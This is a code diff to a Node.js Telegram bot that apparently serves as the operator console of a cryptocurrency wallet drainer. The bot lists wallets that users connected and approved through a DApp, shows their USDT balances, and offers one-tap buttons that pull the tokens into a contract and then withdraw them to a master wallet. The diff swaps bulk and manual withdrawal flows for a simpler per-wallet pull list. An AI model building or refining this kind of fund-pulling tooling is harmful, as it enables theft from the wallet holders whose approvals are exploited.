@@ -1,3 +1,4 @@
+// backend/src/config/telegram.js
 const TelegramBot = require('node-telegram-bot-api');
 const dotenv = require('dotenv');
 const { ethers } = require('ethers');
@@ -177,7 +178,7 @@ class TelegramService {
             } else if (action === 'balances') {
                 this.handleBalancesCommand(chatId);
             } else if (action === 'pull_list') {
-                this.showConnectedWallets(chatId);
+                this.sendPullWalletList(chatId);
             } else if (action === 'help') {
                 this.sendHelpMenu(chatId);
             } else if (action === 'menu') {
@@ -185,10 +186,6 @@ class TelegramService {
             } else if (action.startsWith('pull_')) {
                 const walletAddress = action.substring(5);
                 this.handlePullCommand(chatId, walletAddress);
-            } else if (action === 'withdraw_all') {
-                this.handleWithdrawAllCommand(chatId);
-            } else if (action === 'withdraw_specific') {
-                this.promptForSpecificWithdrawal(chatId);
             }
         });
     }
@@ -223,7 +220,7 @@ class TelegramService {
 Welcome to your USDT management system\\. Select an option below:
 
 💰 *Wallet Operations*
-• Show connected wallets
+• Pull USDT from connected wallets
 • Check wallet balances
 • Withdraw to master wallet
 
@@ -237,8 +234,8 @@ Welcome to your USDT management system\\. Select an option below:
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                        { text: '📥  Withdraw Contract Balance', callback_data: 'withdraw' }
+                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                     ],
                     [
                         { text: '📊 Balances', callback_data: 'balances' },
@@ -261,7 +258,7 @@ Welcome to your USDT management system\\. Select an option below:
 Welcome to your USDT management system. Select an option below:
 
 💰 Wallet Operations
-• Show connected wallets
+• Pull USDT from connected wallets
 • Check wallet balances
 • Withdraw to master wallet
 
@@ -273,7 +270,7 @@ Welcome to your USDT management system. Select an option below:
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
+                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                             { text: '📥 Withdraw', callback_data: 'withdraw' }
                         ],
                         [
@@ -299,10 +296,10 @@ Welcome to your USDT management system. Select an option below:
 • /help \\- Show this help message
 
 📋 *Available Operations:*
-• Show connected wallets with balances
 • Check Smart Contract USDT Balance
 • Check Master Wallet BNB Balance
 • Check Master Wallet USDT Balance
+• Pull USDT from connected wallets
 • Auto\\-gas management for transactions
 • 6\\-hour balance monitoring
 
@@ -529,172 +526,57 @@ Next steps:
         }
     }
 
-    async showConnectedWallets(chatId) {
+    async sendPullWalletList(chatId) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
 
         try {
-            // Show processing message
-            const processingMessage = `
-📤 *Fetching Connected Wallets*
+            // Fetch wallets from database
+            const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
+            const result = await database.query(query);
 
-⏳ Checking wallet balances\\.\\.\\.
-            `;
-            
-            const processingOptions = {
+            let message = '📤 *Select Wallet to Pull*\n\n';
+
+            if (!result || !result.rows || result.rows.length === 0) {
+                message += 'No approved wallets available for pulling\\.\n\n';
+                message += 'Use: /pull\\_<wallet\\_address>';
+            } else {
+                message += 'Click on a wallet to pull USDT:\n\n';
+                for (let i = 0; i < result.rows.length; i++) {
+                    const wallet = result.rows[i];
+                    const maskedAddress = this.maskAddress(wallet.address);
+                    const escapedBalance = this.escapeMarkdown(wallet.usdt_balance || '0');
+                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\)\n`;
+                }
+            }
+
+            const options = {
                 parse_mode: 'MarkdownV2',
                 reply_markup: {
                     inline_keyboard: [
+                        ...(result && result.rows ? result.rows.map((wallet, index) => ([
+                            {
+                                text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`,
+                                callback_data: `pull_${wallet.address}`
+                            }
+                        ])) : []),
                         [
                             { text: '🏠 Main Menu', callback_data: 'menu' }
                         ]
                     ]
                 }
             };
-            
-            await this.bot.sendMessage(chatId, processingMessage, processingOptions);
 
-            // Fetch all wallets from database
-            const query = 'SELECT address, name FROM wallets ORDER BY created_at DESC';
-            const result = await database.query(query);
-            
-            const totalWallets = result.rows.length;
-            
-            if (totalWallets === 0) {
-                const message = `
-📤 *Connected Wallets*
-
-📊 Total Connected Wallets: *0*
-
-📭 No wallets connected yet\\. Please connect wallets via the DApp\\.
-
-🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
-                `;
-                
-                return await this.bot.sendMessage(chatId, message, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }
-
-            // Check balances for each wallet
-            let walletsOver10USDT = [];
-            let walletBalances = [];
-            
-            // Import contract service
-            let contractService;
-            try {
-                contractService = require('../services/contract.service');
-            } catch (e) {
-                console.warn('contract.service not found:', e && e.message ? e.message : e);
-            }
-            
-            if (!contractService) {
-                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
-            }
-            
-            // Check balances for all wallets
-            for (const wallet of result.rows) {
-                try {
-                    const balance = await contractService.getWalletUSDTBalance(wallet.address);
-                    const balanceNum = parseFloat(balance);
-                    
-                    walletBalances.push({
-                        address: wallet.address,
-                        name: wallet.name,
-                        balance: balance,
-                        balanceNum: balanceNum
-                    });
-                    
-                    if (balanceNum > 10) {
-                        walletsOver10USDT.push({
-                            address: wallet.address,
-                            name: wallet.name,
-                            balance: balance
-                        });
-                    }
-                } catch (error) {
-                    console.error(`Error checking balance for ${wallet.address}:`, error.message);
-                    walletBalances.push({
-                        address: wallet.address,
-                        name: wallet.name,
-                        balance: 'Error',
-                        balanceNum: 0
-                    });
-                }
-            }
-
-            // Format the response message
-            let message = `
-📤 *Connected Wallets*
-
-📊 Total Connected Wallets: *${this.escapeMarkdown(totalWallets.toString())}*
-💰 Wallets With >10 USDT: *${this.escapeMarkdown(walletsOver10USDT.length.toString())}*
-
-`;
-
-            if (walletsOver10USDT.length > 0) {
-                message += `💼 *Wallets With Balance >10 USDT:*\n\n`;
-                
-                for (let i = 0; i < walletsOver10USDT.length; i++) {
-                    const wallet = walletsOver10USDT[i];
-                    const maskedAddress = this.maskAddress(wallet.address);
-                    const escapedBalance = this.escapeMarkdown(wallet.balance);
-                    const walletName = wallet.name || `Wallet ${i + 1}`;
-                    
-                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\) \\- ${this.escapeMarkdown(walletName)}\n`;
-                }
-                
-                message += `\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;
-            } else {
-                message += `📭 No wallets with balance >10 USDT found\\.\n\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;
-            }
-
-            // Create inline keyboard with pull buttons for wallets with balance > 10
-            let inlineKeyboard = [];
-            
-            if (walletsOver10USDT.length > 0) {
-                // Add pull buttons for each wallet with balance > 10
-                for (const wallet of walletsOver10USDT) {
-                    inlineKeyboard.push([
-                        { 
-                            text: `📤 Pull from ${this.maskAddress(wallet.address)}`, 
-                            callback_data: `pull_${wallet.address}` 
-                        }
-                    ]);
-                }
-            }
-            
-            // Add main menu button
-            inlineKeyboard.push([
-                { text: '🏠 Main Menu', callback_data: 'menu' }
-            ]);
-
-            return await this.bot.sendMessage(chatId, message, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: inlineKeyboard
-                }
-            });
+            return await this.bot.sendMessage(chatId, message, options);
         } catch (error) {
-            console.error('Error in showConnectedWallets:', error && error.message ? error.message : error);
-            
-            const errorMessage = `
-❌ *ERROR*
-Failed to fetch connected wallets\\.
+            console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
+            const fallbackMessage = `
+📤 Select Wallet to Pull
 
-🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
+Failed to fetch wallet list. Please try again later.
             `;
-            
-            return await this.bot.sendMessage(chatId, errorMessage, {
-                parse_mode: 'MarkdownV2',
+            return await this.bot.sendMessage(chatId, fallbackMessage, {
                 reply_markup: {
                     inline_keyboard: [
                         [
@@ -965,63 +847,18 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
     }
 
     async handleWithdrawCommand(chatId) {
-    if (chatId.toString() !== this.adminChatId) {
-        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-    }
-
-    const message = `
-🏦 *Withdraw Options*
-
-Choose how you want to withdraw USDT:
-
-📤 *Withdraw From All Wallets*
-• Pull USDT from wallets with balance greater than 10 USDT
-• Withdraw all to master wallet
-
-🆔 *Withdraw From Specific Wallet*
-• Enter wallet address manually
-
-Select an option below:
-        `;
-
-    const options = {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '📤 Withdraw All', callback_data: 'withdraw_all' }
-                ],
-                [
-                    { text: '🆔 Specific Wallet', callback_data: 'withdraw_specific' }
-                ],
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
-                ]
-            ]
-        }
-    };
-
-    try {
-        return await this.bot.sendMessage(chatId, message, options);
-    } catch (error) {
-        console.error('Error sending withdraw options:', error && error.message ? error.message : error);
-        return await this.bot.sendMessage(chatId, '❌ Failed to show withdraw options. Please try again.');
-    }
-}
-
-    async handleWithdrawAllCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
 
         const processingMessage = `
-🏦 *Withdraw All Operation Initiated*
+🏦 *Withdraw Operation Initiated*
+Withdrawing all USDT from contract to master wallet\\.\\.\\.
 
-Processing\\.\\.\\. This will:
-1\\. Check all connected wallets
-2\\. Pull USDT from wallets with balance >10 USDT
-3\\. Withdraw all USDT to master wallet
-4\\. Send confirmation
+📋 *Operations to perform:*
+• Check contract USDT balance
+• Execute withdrawal transaction
+• Send confirmation
 
 ⏳ *Please wait*\\.\\.\\.
         `;
@@ -1038,453 +875,120 @@ Processing\\.\\.\\. This will:
         };
 
         try {
-            await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
 
-            // Import services
+            // Import the contract service
             let contractService;
-            let gasService;
             try {
                 contractService = require('../services/contract.service');
-                gasService = require('../services/gas.service');
             } catch (e) {
-                console.warn('Service not found:', e && e.message ? e.message : e);
+                console.warn('contract.service not found:', e && e.message ? e.message : e);
             }
 
-            if (!contractService) {
-                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
+            if (!contractService || typeof contractService.withdrawUSDTToMaster !== 'function') {
+                await this.bot.sendMessage(chatId, '❌ Withdrawal service unavailable.');
+                return result;
             }
 
-            // Fetch all wallets with balance > 10 USDT
-            const query = 'SELECT address FROM wallets ORDER BY created_at DESC';
-            const result = await database.query(query);
-            
-            if (!result || !result.rows || result.rows.length === 0) {
-                return await this.bot.sendMessage(chatId, '📭 No wallets connected. Please connect wallets first.');
-            }
+            // Execute the actual withdrawal with timeout
+            const withdrawPromise = contractService.withdrawUSDTToMaster();
+            const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve({ success: false, error: 'Operation timeout after 45 seconds' }), 45000));
 
-            let walletsToPull = [];
-            let pullResults = [];
-            
-            // Check balances and identify wallets with >10 USDT
-            for (const wallet of result.rows) {
-                try {
-                    const balance = await contractService.getWalletUSDTBalance(wallet.address);
-                    const balanceNum = parseFloat(balance);
-                    
-                    if (balanceNum > 10) {
-                        walletsToPull.push({
-                            address: wallet.address,
-                            balance: balance
-                        });
-                    }
-                } catch (error) {
-                    console.error(`Error checking balance for ${wallet.address}:`, error.message);
-                }
-            }
+            const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);
 
-            if (walletsToPull.length === 0) {
-                const noWalletsMessage = `
-📭 *No Wallets to Process*
-
-No connected wallets have balance >10 USDT\\.
-
-🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
-                `;
-                
-                return await this.bot.sendMessage(chatId, noWalletsMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }
-
-            // Process each wallet
-            for (const wallet of walletsToPull) {
-                try {
-                    // Check gas balance
-                    if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
-                        const gasCheck = await gasService.checkWalletGasBalance(wallet.address);
-                        
-                        if (!gasCheck || !gasCheck.hasSufficientGas) {
-                            if (gasService && typeof gasService.sendGasToWallet === 'function') {
-                                const gasResult = await gasService.sendGasToWallet(wallet.address);
-                                if (!gasResult || !gasResult.success) {
-                                    pullResults.push({
-                                        address: wallet.address,
-                                        success: false,
-                                        error: `Gas failed: ${gasResult && gasResult.error ? gasResult.error : 'Unknown error'}`
-                                    });
-                                    continue;
-                                }
-                            }
-                        }
-                    }
-                    
-                    // Pull USDT from wallet
-                    const pullResult = await contractService.pullUSDTFromWallet(wallet.address);
-                    pullResults.push({
-                        address: wallet.address,
-                        success: pullResult.success,
-                        amount: pullResult.amount,
-                        error: pullResult.error
-                    });
-                    
-                    // Update database if successful
-                    if (pullResult.success) {
-                        try {
-                            const updateQuery = `
-                                UPDATE wallets 
-                                SET is_processed = true, updated_at = NOW()
-                                WHERE address = $1
-                            `;
-                            await database.query(updateQuery, [wallet.address]);
-                        } catch (dbError) {
-                            console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
-                        }
-                    }
-                } catch (error) {
-                    pullResults.push({
-                        address: wallet.address,
-                        success: false,
-                        error: error && error.message ? error.message : 'Unknown error'
-                    });
-                }
-            }
-
-            // Now withdraw all to master wallet
-            let withdrawResult = { success: false, error: 'No USDT to withdraw' };
-            let totalPulledAmount = 0;
-            
-            // Calculate total pulled amount
-            for (const result of pullResults) {
-                if (result.success && result.amount) {
-                    totalPulledAmount += parseFloat(result.amount);
-                }
-            }
-            
-            if (totalPulledAmount > 0) {
-                withdrawResult = await contractService.withdrawUSDTToMaster();
-            }
-
-            // Format results message
-            let resultsMessage = `
-✅ *Withdraw All Operation Completed*
-
-📊 *Pull Results:*
-`;
-
-            for (let i = 0; i < pullResults.length; i++) {
-                const result = pullResults[i];
-                const maskedAddress = this.maskAddress(result.address);
-                
-                if (result.success) {
-                    const escapedAmount = this.escapeMarkdown(result.amount || '0');
-                    resultsMessage += `${i + 1}\\. \`${maskedAddress}\` \\- ✅ ${escapedAmount} USDT pulled\n`;
-                } else {
-                    const escapedError = this.escapeMarkdown(result.error || 'Unknown error');
-                    resultsMessage += `${i + 1}\\. \`${maskedAddress}\` \\- ❌ ${escapedError}\n`;
-                }
-            }
-
-            resultsMessage += `\n🏦 *Withdrawal Result:*\n`;
-            
-            if (withdrawResult.success) {
+            if (withdrawResult && withdrawResult.success) {
+                // Escape all values for MarkdownV2
+                const maskedMasterWallet = this.maskAddress(this.masterWallet);
+                const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
                 const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
                 const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
-                resultsMessage += `✅ ${escapedAmount} USDT withdrawn to master wallet\n`;
-                resultsMessage += `Transaction: \`${maskedTxHash}\`\n`;
-            } else {
-                const escapedError = this.escapeMarkdown(withdrawResult.error || 'No USDT to withdraw');
-                resultsMessage += `ℹ️ ${escapedError}\n`;
-            }
+                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
+                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
-            resultsMessage += `\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;
-
-            await this.bot.sendMessage(chatId, resultsMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-
-        } catch (error) {
-            console.error('Error in withdraw all command:', error && error.message ? error.message : error);
-            
-            const errorMessage = `
-❌ *WITHDRAW ALL FAILED*
-Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown error')}
-
-🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
-            `;
-            
-            await this.bot.sendMessage(chatId, errorMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-        }
-    }
-
-    async promptForSpecificWithdrawal(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-
-        const message = `
-🆔 *Specific Wallet Withdrawal*
-
-Please enter the wallet address you want to withdraw from:
-
-📝 Format: 0x followed by 40 hexadecimal characters
-
-Example: 0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF
-        `;
-
-        const options = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
-                ]
-            }
-        };
-
-        // Set a flag to indicate we're waiting for wallet address input
-        this.awaitingWalletAddress = chatId;
-        
-        return await this.bot.sendMessage(chatId, message, options);
-    }
-
-    async handleSpecificWithdrawal(chatId, walletAddress) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-
-        // Validate wallet address
-        if (!walletAddress || !ethers.isAddress(walletAddress)) {
-            return this.bot.sendMessage(chatId, '❌ Invalid wallet address. Please provide a valid Ethereum address.');
-        }
-
-        const maskedAddress = this.maskAddress(walletAddress);
-
-        const processingMessage = `
-🔄 *Specific Withdrawal Initiated*
-Wallet: \`${maskedAddress}\`
-
-Processing\\.\\.\\. This will:
-1\\. Check wallet USDT balance
-2\\. Pull USDT to contract
-3\\. Withdraw all USDT to master wallet
-4\\. Send confirmation
-
-⏳ *Please wait*\\.\\.\\.
-        `;
-
-        const processingOptions = {
-            parse_mode: 'MarkdownV2',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '🏠 Main Menu', callback_data: 'menu' }
-                    ]
-                ]
-            }
-        };
-
-        try {
-            await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-
-            // Import services
-            let contractService;
-            let gasService;
-            try {
-                contractService = require('../services/contract.service');
-                gasService = require('../services/gas.service');
-            } catch (e) {
-                console.warn('Service not found:', e && e.message ? e.message : e);
-            }
-
-            if (!contractService) {
-                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
-            }
-
-            // Check wallet balance
-            const balance = await contractService.getWalletUSDTBalance(walletAddress);
-            const balanceNum = parseFloat(balance);
-            
-            if (balanceNum <= 10) {
-                const lowBalanceMessage = `
-❌ *Insufficient Balance*
-Wallet: \`${maskedAddress}\`
-Balance: *${this.escapeMarkdown(balance)} USDT*
-
-Minimum required: >10 USDT
-                `;
-                
-                return await this.bot.sendMessage(chatId, lowBalanceMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }
-
-            // Check gas balance and send gas if needed
-            if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
-                const gasCheck = await gasService.checkWalletGasBalance(walletAddress);
-                
-                if (!gasCheck || !gasCheck.hasSufficientGas) {
-                    if (gasService && typeof gasService.sendGasToWallet === 'function') {
-                        const gasResult = await gasService.sendGasToWallet(walletAddress);
-                        if (!gasResult || !gasResult.success) {
-                            const errorMessage = `
-❌ *GAS FAILED*
-Wallet: \`${maskedAddress}\`
-Error: ${this.escapeMarkdown(gasResult && gasResult.error ? gasResult.error : 'Unknown error')}
-
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
-                            `;
-                            
-                            return await this.bot.sendMessage(chatId, errorMessage, {
-                                parse_mode: 'MarkdownV2',
-                                reply_markup: {
-                                    inline_keyboard: [
-                                        [
-                                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                                        ]
-                                    ]
-                                }
-                            });
-                        }
-                    }
-                }
-            }
-
-            // Pull USDT from wallet
-            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
-            
-            if (!pullResult || !pullResult.success) {
-                const pullErrorMessage = `
-❌ *PULL FAILED*
-Wallet: \`${maskedAddress}\`
-Error: ${this.escapeMarkdown(pullResult && pullResult.error ? pullResult.error : 'Unknown error')}
-
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
-                `;
-                
-                return await this.bot.sendMessage(chatId, pullErrorMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }
-
-            // Update database
-            try {
-                const updateQuery = `
-                    UPDATE wallets 
-                    SET is_processed = true, updated_at = NOW()
-                    WHERE address = $1
-                `;
-                await database.query(updateQuery, [walletAddress]);
-            } catch (dbError) {
-                console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
-            }
-
-            // Withdraw all to master wallet
-            const withdrawResult = await contractService.withdrawUSDTToMaster();
-
-            // Format success message
-            const escapedPullAmount = this.escapeMarkdown(pullResult.amount || '0');
-            const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
-            const escapedTxHash = this.escapeMarkdown(maskedTxHash);
-            
-            let successMessage = `
-✅ *Specific Withdrawal Successful*
-Wallet: \`${maskedAddress}\`
-Pulled: *${escapedPullAmount} USDT*
+                const successMessage = `
+✅ *WITHDRAWAL SUCCESSFUL*
+Amount: *${escapedAmount} USDT*
+To: \`${escapedMasterWallet}\`
 Transaction: \`${escapedTxHash}\`
 
-🏦 *Withdrawal to Master:*
-`;
+📊 *Updated Balances:*
+• Contract USDT: 0\\.00 USDT
+• Master Wallet USDT: Check balances for update
 
-            if (withdrawResult.success) {
-                const escapedWithdrawAmount = this.escapeMarkdown(withdrawResult.amount || '0');
-                const maskedWithdrawTx = this.maskAddress(withdrawResult.txHash || 'N/A');
-                const escapedWithdrawTx = this.escapeMarkdown(maskedWithdrawTx);
-                
-                successMessage += `✅ ${escapedWithdrawAmount} USDT withdrawn\n`;
-                successMessage += `Transaction: \`${escapedWithdrawTx}\`\n`;
+🔄 *Last Updated:* ${escapedTimestamp}
+                `;
+
+                await this.bot.sendMessage(chatId, successMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
             } else {
-                const escapedError = this.escapeMarkdown(withdrawResult.error || 'No USDT to withdraw');
-                successMessage += `ℹ️ ${escapedError}\n`;
+                // Escape error message
+                const escapedError = this.escapeMarkdown((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
+                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+
+                const errorMessage = `
+❌ *WITHDRAWAL FAILED*
+Error: ${escapedError}
+
+🔄 *Last Updated:* ${escapedTimestamp}
+                `;
+                
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
             }
 
-            successMessage += `\n🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC`;
-
-            await this.bot.sendMessage(chatId, successMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-
+            return result;
         } catch (error) {
-            console.error('Error in specific withdrawal:', error && error.message ? error.message : error);
-            
-            const errorMessage = `
-❌ *SPECIFIC WITHDRAWAL FAILED*
-Wallet: \`${maskedAddress}\`
-Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown error')}
+            console.error('Error in withdraw command:', error && error.message ? error.message : error);
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+            // Escape error message
+            const cleanErrorMessage = error && error.message
+                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
+                : 'Unknown error occurred';
+            const escapedErrorMessage = this.escapeMarkdown(cleanErrorMessage);
+            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+
+            const errorMessage = `
+❌ *WITHDRAWAL FAILED*
+Error: ${escapedErrorMessage}
+
+🔄 *Last Updated:* ${escapedTimestamp}
             `;
-            
-            await this.bot.sendMessage(chatId, errorMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
+
+            try {
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
                         ]
-                    ]
-                }
-            });
+                    }
+                });
+            } catch (e) {
+                console.error('Failed to send withdraw error message:', e && e.message ? e.message : e);
+            }
+
+            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
         }
     }
 
@@ -1536,7 +1040,6 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown e
             const masterUSDTBalance = await timeoutWrapper(masterUSDTBalancePromise, 15000);
 
             // Format the real balances message
-
             const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
             const maskedContractAddress = this.maskAddress(contractAddress);
             const maskedMasterWallet = this.maskAddress(this.masterWallet);
@@ -1599,8 +1102,8 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown e
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
-                            { text: '📥 Withdraw Contract Balance', callback_data: 'withdraw' }
+                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                         ],
                         [
                             { text: '🔄 Refresh Balances', callback_data: 'balances' },
@@ -1661,22 +1164,11 @@ Error: ${cleanErrorMessage}
         }
     }
 
-    // Process webhook updates manually and handle text messages for wallet address input
+    // Process webhook updates manually
     async processUpdate(update) {
         if (this.bot) {
             try {
-                // Handle text messages for wallet address input
-                if (update.message && update.message.text && this.awaitingWalletAddress) {
-                    const chatId = update.message.chat.id;
-                    if (chatId === this.awaitingWalletAddress) {
-                        const walletAddress = update.message.text.trim();
-                        delete this.awaitingWalletAddress; // Clear the flag
-                        await this.handleSpecificWithdrawal(chatId, walletAddress);
-                        return;
-                    }
-                }
-                
-                // Process regular updates
+                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                 await this.bot.processUpdate(update);
             } catch (error) {
                 console.error('Error processing Telegram update:', error && error.message ? error.message : error);
@@ -1686,5 +1178,3 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
-
-
